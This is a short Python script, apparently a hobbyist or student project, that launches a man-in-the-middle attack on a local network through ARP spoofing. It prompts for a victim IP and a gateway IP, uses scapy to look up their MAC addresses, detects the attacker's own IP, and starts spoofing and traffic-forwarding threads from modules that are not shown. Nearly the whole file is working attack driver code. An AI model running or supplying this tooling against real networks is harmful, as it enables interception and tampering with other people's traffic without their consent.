"""
Author: Doron Goldman
An python program implenting man in the middle attack through arp spoofing
"""
import socket
import scapy.all as sp
from uuid import getnode as get_mac
from arp_spoof import arp_spoof_t
from ip_forward import Mitm_Thread
sp.conf.verb = 0
BROADCAST = "ff:ff:ff:ff:ff:ff"


class Attack_Info(object, ):
    """
    This class contain all the data nesscry for the attack
    """
    def __init__(self,victim_ip ,gate_ip , my_ip):
        """
        victim_ip: the victim`s ip
        gate_ip: the gateaway (router) ip
        my_ip: the attacker`s ip
        """
        self.mIP = my_ip
        self.gIP = gate_ip
        self.vIP = victim_ip
        self.mac = ':'.join(("%012X" % get_mac())[i:i+2] for i in range(0, 12, 2))
        self.arp_table = {ip: Attack_Info.get_mac(ip) for ip in [self.vIP,self.gIP]}

    @staticmethod
    def get_mac(IP):
        """
        args:
        IP:  an ip address
        returns: return the corresponding mac adress
        using the basic arp protocol to discover the targets real mac addres
        """
        ans, uans = sp.srp(sp.Ether(dst=BROADCAST) / sp.ARP(pdst=IP),
                        timeout=2, inter=0.1)
        for snd, rcv in ans:
            # format the mac address from the arp replay
            return rcv.sprintf(r"%Ether.src%")




vIP, gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
mIP = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
info = Attack_Info(vIP, gIP, mIP)
attack = arp_spoof_t(info, )
forward = Mitm_Thread(info, )
forward.start()
attack.start()
raw_input()
